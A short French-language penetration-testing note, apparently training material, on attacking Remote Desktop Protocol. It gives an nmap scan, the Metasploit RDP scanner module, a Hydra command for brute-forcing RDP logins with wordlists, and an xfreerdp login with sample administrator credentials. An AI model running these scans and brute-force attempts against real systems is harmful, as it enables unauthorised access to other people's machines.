
RDP est un protocole propriétaire d'accès à distance développé par microsoft.  
Il utilise le port 3389 et le protocole de transport TCP.  

RDP a besoin d'un username et password.  
On peut brute forcer l'authentification pour accéder au service.  

La première étape consiste à scanner la cible :  
`nmap -sV -O 10.2.24.86`  

### Scanner RDP Metasploit
utiliser `auxiliary/scanner/rdp/rdp_scanner` (renseigner RHOSTS, RPORT si le port est différent du port par défaut dans le scan)  
Metasploit renvoie la présence d'un service RDP actif et donnera la version de l'OS.  

### Bruteforce avec Hydra  
`hydra -L Users_wordlist.txt -P Passwords_wordlist.txt rdp://IP_target_address -s Port`  
Si la machine cible utilise freexrd, voici la connexion :
`xfreerdp /u:administrator /p:password123 /v:192.168.1.1`